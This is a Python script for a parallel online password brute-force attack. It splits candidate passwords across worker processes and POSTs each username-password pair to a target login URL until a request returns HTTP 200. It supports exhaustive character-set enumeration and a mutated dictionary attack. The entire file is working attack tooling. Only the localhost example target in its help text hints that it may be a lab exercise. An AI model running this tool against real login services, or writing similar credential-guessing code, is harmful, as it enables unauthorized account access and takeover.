#!/usr/bin/env python3
"""
Parallel brute-force attack with multi-processing.

Distributes workload across multiple worker processes. Each worker tests candidates
where (candidate_index % num_workers == worker_id).

Supports three modes:
  - mono: Monolithic alphabet (digits/lower/upper/custom)
  - poly: Polymorphic (combinable --digits --lower --upper --symbols)
  - dict: Dictionary attack with mutations

"""

import argparse
import itertools
import multiprocessing
import sys
import time
import string
import requests
from itertools import islice
from pathlib import Path
from mono_attack import build_alphabet as build_mono_alphabet
from poly_attack import build_alphabet as build_poly_alphabet
from dictionary_attack import load_wordlist, mutate_word


def generate_candidates_mono(alphabet, max_len):
    """Generate all candidates for mono mode (all lengths 1..max_len)."""
    for length in range(1, max_len + 1):
        for tup in itertools.product(alphabet, repeat=length):
            yield "".join(tup)


def generate_candidates_poly(alphabet, max_len):
    """Generate all candidates for poly mode (all lengths 1..max_len)."""
    # Same as mono
    return generate_candidates_mono(alphabet, max_len)


def generate_candidates_dict(wordlist):
    """Generate all candidates for dict mode (words + mutations)."""
    for word in wordlist:
        for candidate in mutate_word(word):
            yield candidate


def try_post(url, payload, timeout=5.0):
    """POST JSON payload to url. Returns response or None on error."""
    try:
        r = requests.post(url, json=payload, timeout=timeout)
        return r
    except requests.RequestException:
        return None



def worker_process(worker_id, num_workers, target_url, username, mode, args_dict, found_event, result_queue):
    """Worker process that tests a subset of candidates."""
    # Build candidate generator based on mode
    if mode == "mono":
        alphabet = build_mono_alphabet(args_dict["alphabet"], args_dict.get("custom"))
        max_len = args_dict["max_len"]
        candidates = generate_candidates_mono(alphabet, max_len)
    elif mode == "poly":
        # try external helper first (some versions accept different signatures)
        try:
            # preferred: if build_poly_alphabet expects four booleans
            alphabet = build_poly_alphabet(
                args_dict.get("digits", False),
                args_dict.get("lower", False),
                args_dict.get("upper", False),
                args_dict.get("symbols", False),
            )
        except TypeError:
            # fallback: build alphabet locally from flags (works reliably)
            parts = []
            if args_dict.get("digits", False):
                parts.append(string.digits)
            if args_dict.get("lower", False):
                parts.append(string.ascii_lowercase)
            if args_dict.get("upper", False):
                parts.append(string.ascii_uppercase)
            if args_dict.get("symbols", False):
                parts.append("!@#$%^&*()_+-=[]{}|;:',.<>?/")
            if not parts:
                print(f"[Worker {worker_id}] Poly mode requires at least one of --digits/--lower/--upper/--symbols", file=sys.stderr)
                return
            alphabet = "".join(parts)

        max_len = args_dict["max_len"]
        candidates = generate_candidates_poly(alphabet, max_len)

    elif mode == "dict":
        wordlist = load_wordlist(args_dict["wordlist_path"])
        candidates = generate_candidates_dict(wordlist)
    else:
        print(f"[Worker {worker_id}] Unknown mode: {mode}", file=sys.stderr)
        return

    attempts = 0
    assigned_iter = islice(candidates, worker_id, None, num_workers)
    for candidate in assigned_iter:
        if found_event.is_set():
            print(f"[Worker {worker_id}] Stopping (password found by another worker)")
            return

        payload = {"username": username, "password": candidate}
        r = try_post(target_url, payload)
        attempts += 1

        
        if r and r.status_code == 200:
            # Found it!
            found_event.set()
            result_queue.put((worker_id, candidate, attempts))
            print(f"[Worker {worker_id}] FOUND: {candidate} (after {attempts} attempts)")
            return
        
        # progress reporting
        if attempts % 500 == 0:
            print(f"[Worker {worker_id}] Tested {attempts} candidates, last='{candidate}'")
    
    print(f"[Worker {worker_id}] Exhausted keyspace (tested {attempts} candidates)")


def main():
    parser = argparse.ArgumentParser(description="Parallel brute-force attack")
    parser.add_argument("--mode", required=True, choices=["mono", "poly", "dict"], help="Attack mode")
    parser.add_argument("--target", required=True, help="Target URL (e.g. http://127.0.0.1:5000/login)")
    parser.add_argument("--user", required=True, help="Username to test")
    parser.add_argument("--workers", type=int, default=4, help="Number of worker processes")
    
    # Mono mode args
    parser.add_argument("--alphabet", choices=["digits", "lower", "upper", "custom"], help="Alphabet for mono mode")
    parser.add_argument("--custom", help="Custom alphabet string for mono mode")
    
    # Poly mode args
    parser.add_argument("--digits", action="store_true", help="Include digits (poly mode)")
    parser.add_argument("--lower", action="store_true", help="Include lowercase (poly mode)")
    parser.add_argument("--upper", action="store_true", help="Include uppercase (poly mode)")
    parser.add_argument("--symbols", action="store_true", help="Include symbols (poly mode)")
    
    # Mono/Poly shared
    parser.add_argument("--max-len", type=int, default=4, help="Maximum password length (mono/poly modes)")
    
    # Dict mode args
    parser.add_argument("--list", help="Path to wordlist file (dict mode)")
    
    args = parser.parse_args()
    
    # Validate mode-specific args
    if args.mode == "mono" and not args.alphabet:
        print("[!] Mono mode requires --alphabet", file=sys.stderr)
        return 2
    if args.mode == "dict" and not args.list:
        print("[!] Dict mode requires --list", file=sys.stderr)
        return 2
    
    # Build args_dict for workers
    args_dict = {}
    if args.mode == "mono":
        args_dict = {
            "alphabet": args.alphabet,
            "custom": args.custom,
            "max_len": args.max_len,
        }
    elif args.mode == "poly":
        args_dict = {
            "digits": args.digits,
            "lower": args.lower,
            "upper": args.upper,
            "symbols": args.symbols,
            "max_len": args.max_len,
        }
    elif args.mode == "dict":
        args_dict = {
            "wordlist_path": args.list,
        }
    
    print("=" * 70)
    print(f"PARALLEL ATTACK ({args.mode.upper()} MODE)")
    print("=" * 70)
    print(f"Target: {args.target}")
    print(f"User: {args.user}")
    print(f"Workers: {args.workers}")
    print("=" * 70)
    print()
    
    # Create shared state
    found_event = multiprocessing.Event()
    result_queue = multiprocessing.Queue()
    
    # Start workers
    processes = []
    start_time = time.time()
    
    for worker_id in range(args.workers):
        p = multiprocessing.Process(
            target=worker_process,
            args=(worker_id, args.workers, args.target, args.user, args.mode, args_dict, found_event, result_queue),
        )
        p.start()
        processes.append(p)
        print(f"[Main] Started worker {worker_id} (PID {p.pid})")
    
    print()
    
    # Wait for workers to finish
    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user, terminating workers...")
        found_event.set()
        for p in processes:
            p.terminate()
            p.join(timeout=2)
        return 130
    
    elapsed = time.time() - start_time
    
    # Check if password was found
    if not result_queue.empty():
        worker_id, password, attempts = result_queue.get()
        print()
        print("=" * 70)
        print(f"SUCCESS: Password found by worker {worker_id}")
        print(f"Password: {password}")
        print(f"Attempts by winning worker: {attempts}")
        print(f"Total time: {elapsed:.2f}s")
        print("=" * 70)
        return 0
    else:
        print()
        print("=" * 70)
        print("NOT FOUND: All workers exhausted their keyspace")
        print(f"Total time: {elapsed:.2f}s")
        print("=" * 70)
        return 1


if __name__ == "__main__":
    # Required for Windows multiprocessing
    multiprocessing.freeze_support()
    raise SystemExit(main())
